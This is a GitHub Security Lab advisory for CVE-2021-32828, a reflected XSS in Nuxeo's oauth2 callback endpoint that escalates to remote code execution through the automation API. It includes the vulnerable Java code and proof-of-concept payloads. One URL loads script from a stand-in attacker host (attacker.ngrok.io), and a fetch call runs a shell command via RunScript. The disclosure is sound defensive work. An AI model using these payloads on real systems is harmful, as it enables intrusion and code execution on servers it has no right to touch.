<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-072: Reflected Cross-Site Scripting (XSS) leading to Remote Code Execution (RCE) in Nuxeo - CVE-2021-32828</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-28: Requested security contact</li>
  <li>2021-04-29: Sent report to security@nuxeo.com</li>
  <li>2021-06-07: Issue is fixed</li>
  <li>2021-06-15: Nuxeo requests to postpone publication to allow users to upgrade</li>
  <li>2021-07-21: Publication of the advisory</li>
</ul>

<h2 id="summary">Summary</h2>
<p>The <code class="language-plaintext highlighter-rouge">oauth2</code> REST API is vulnerable to Reflected Cross-Site Scripting (XSS). This XSS can be escalated to Remote Code Execution (RCE) by levering the automation API.</p>

<h2 id="product">Product</h2>
<p>Nuxeo Platform</p>

<h2 id="tested-version">Tested Version</h2>
<p>v11.5.109</p>

<h2 id="details">Details</h2>

<p>The <a href="https://github.com/nuxeo/nuxeo/blob/master/modules/platform/nuxeo-platform-oauth/src/main/java/org/nuxeo/ecm/webengine/oauth2/OAuth2Callback.java"><code class="language-plaintext highlighter-rouge">/oauth2/{serviceProviderName}/callback</code></a> REST endpoint is vulnerable to XSS:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    @GET
    @Path("{serviceProviderName}/callback")
    public Object doGet(@PathParam("serviceProviderName") String serviceProviderName)
            throws IOException {

        OAuth2ServiceProviderRegistry registry = Framework.getService(OAuth2ServiceProviderRegistry.class);
        OAuth2ServiceProvider provider = registry.getProvider(serviceProviderName);
        if (provider == null) {
            return Response.status(HttpServletResponse.SC_NOT_FOUND).entity(
                    "No service provider called: \"" + serviceProviderName + "\".").build();
        }

        Map&lt;String, Object&gt; args = new HashMap&lt;&gt;();

        new UnrestrictedSessionRunner(ctx.getCoreSession()) {
            @Override
            public void run() {
                try {
                    credential = provider.handleAuthorizationCallback(request);
                } catch (NuxeoException e) {
                    log.error("Authorization request failed", e);
                    args.put("error", "Authorization request failed");
                }
            }
        }.runUnrestricted();

        String token = (credential == null) ? "" : credential.getAccessToken();
        args.put("token", token);
        return getView("index").args(args);
    }
</code></pre></div></div>

<p>Because the endpoint does not use the <code class="language-plaintext highlighter-rouge">@Produces</code> annotation or a explicit call to <code class="language-plaintext highlighter-rouge">Response.type()</code> to limit the content type of the HTTP response, Jersey will use attacker supplied content-type specified in the <code class="language-plaintext highlighter-rouge">Accept</code> header to decide what content type the response should have. If a logged-in user is tricked into visiting this endpoint, the XSS will trigger. eg:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://localhost:8080/nuxeo/site/oauth2/%3Cimg%20src%20onerror=alert(document.domain)%3E/callback
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>Because Nuxeo exposes a powerful automation API, the XSS can be used to reach the <code class="language-plaintext highlighter-rouge">runScript</code> endpoint (or any automation endpoint sinxe they accept <code class="language-plaintext highlighter-rouge">expr</code> parameters) and achieve remote code execution (RCE).</p>

<p>For example, an attacker can use a URL like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/nuxeo/site/oauth2/%3Cimg%20src%20onerror%3Da%3Ddocument.createElement('script')%3ba.setAttribute('src',document.location.hash.substr(1))%3bdocument.head.appendChild(a)%3E/callback#//attacker.ngrok.io/exploit.js
</code></pre></div></div>

<p>Which will execute the Javascript code provided by the attacker in <code class="language-plaintext highlighter-rouge">http://attacker.ngrok.io/exploit.js</code>. Here, an attacker can trigger a second request to the automation <code class="language-plaintext highlighter-rouge">runScript</code> endpoint and run arbitrary code:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost:8080/nuxeo/site/automation/RunScript</span><span class="dl">"</span><span class="p">,{</span><span class="na">method</span><span class="p">:</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span><span class="na">headers</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">},</span><span class="na">body</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">script</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Runtime.getRuntime().exec('touch /tmp/pwned');</span><span class="dl">"</span><span class="p">},</span><span class="dl">"</span><span class="s2">context</span><span class="dl">"</span><span class="p">:{}})})</span>
</code></pre></div></div>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32828</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-072</code> in any communication regarding this issue.</p>


   